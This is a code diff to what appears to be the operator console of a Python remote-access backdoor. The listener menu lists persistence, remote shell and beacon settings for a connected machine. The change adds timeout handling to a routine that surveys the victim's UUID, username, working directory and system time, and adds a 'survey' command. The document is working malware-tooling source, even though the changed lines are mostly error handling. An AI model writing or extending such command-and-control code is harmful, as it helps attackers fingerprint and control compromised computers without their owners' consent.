@@ -316,18 +316,36 @@ def delete_task_file(task_file_name):
         pass
 
 def run_initial_survey(conn):
-    uuid = get_uuid(conn)
-    time = get_time(conn)
-    get_working_dir(conn)
-    username = get_username(conn)
-    print()
-    print(WHITE)
-    print("UUID: " + uuid)
-    print("Connection From: " + CONNECTED_HOST)
-    print("Working Dir: " + CURRENT_WORKING_DIR)
-    print("System Time: " + time)
-    print("Username: " + username)
-    print(RSTCOLORS)
+    global CURRENT_WORKING_DIR
+    try:    
+        try:
+            uuid = get_uuid(conn)
+        except socket.timeout:
+            uuid = "UNK - TIMEOUT"
+        try:
+            time = get_time(conn)
+        except socket.timeout:
+            time = "UNK - TIMEOUT"
+        try:
+            get_working_dir(conn)
+        except socket.timeout:
+            CURRENT_WORKING_DIR = "UNK - TIMEOUT"
+        try:
+            username = get_username(conn)
+        except socket.timeout:
+            username = "UNK - TIMEOUT"
+        print()
+        print(WHITE)
+        print("UUID: " + uuid)
+        print("Connection From: " + CONNECTED_HOST)
+        print("Working Dir: " + CURRENT_WORKING_DIR)
+        print("System Time: " + time)
+        print("Username: " + username)
+        print(RSTCOLORS)
+    except Exception as e:
+        print(exc_info())
+        print(e)
+        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def get_time(conn):
     if CONFIG['DEBUG']:
@@ -398,6 +416,7 @@ def listen():
     5 - Persistence
     6 - Print uuid
     7 - Print Working Directory
+    survey - run the initial survey
     shell - Start a Shell
     beacon - Change Beacon Settings"""
 
@@ -568,6 +587,9 @@ def listen():
                 elif cmd == "7":
                     get_working_dir(conn)
                     print(BLUE + "CWD: {}{}".format(CURRENT_WORKING_DIR,RSTCOLORS))
+                    cmd = ""
+                elif cmd == "survey":
+                    run_initial_survey(conn)
                     cmd = ""
                 elif cmd.lower() == "shell":
                     while cmd.lower() == "shell":
